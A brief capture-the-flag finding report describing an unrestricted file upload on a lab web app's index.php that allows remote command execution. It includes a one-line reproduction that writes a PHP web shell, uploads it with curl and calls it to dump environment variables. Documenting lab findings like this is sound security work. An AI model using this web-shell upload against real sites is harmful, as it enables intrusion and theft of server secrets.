findings.title: Unrestricted File Upload Leading to RCE - CTF Flag Found
findings.description: The image upload page at index.php accepts any file type without validation. Uploading a PHP webshell and accessing it via /upload/ allows arbitrary command execution. Environment variables reveal the CTF flag.

reproduction.command: echo '<?php system("env"); ?>' > /tmp/test.php && curl -s -X POST http://172.17.0.1:60305/index.php -F "userfile=@/tmp/test.php" -F "submit=Upload Image" && curl -s http://172.17.0.1:60305/upload/test.php
